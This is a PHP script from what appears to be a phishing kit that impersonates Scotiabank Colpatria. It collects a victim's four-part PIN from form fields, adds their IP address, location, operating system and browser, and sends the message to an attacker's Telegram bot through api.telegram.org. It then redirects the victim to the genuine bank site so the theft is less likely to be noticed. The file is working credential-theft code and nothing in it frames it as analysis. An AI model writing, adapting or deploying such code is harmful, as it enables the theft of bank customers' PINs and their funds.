<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('tlgm.php');
include('funciones.php');
////////////////////

if ( isset ($_POST['numone']) && isset ($_POST['numtow']) && isset ($_POST['numthere']) && isset ($_POST['numfour'])){


$message = "✔️✔️COLPATRIA✔️✔️\r\nP1N: ".$_POST['numone'].$_POST['numtow'].$_POST['numthere'].$_POST['numfour']."\r\n
\r\nFecha: ".date ('l jS \of F Y h:i:s A',time())."\r\nIp y Localidad: ".$myip." ".$pais." ".$region."\r\nSO: ".$user_os."\r\nNavegador: ".$navegador."";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}
header('location: https://www.digital.scotiabankcolpatria.com/rob/inicio/cuenta-de-ahorros/zero');
?>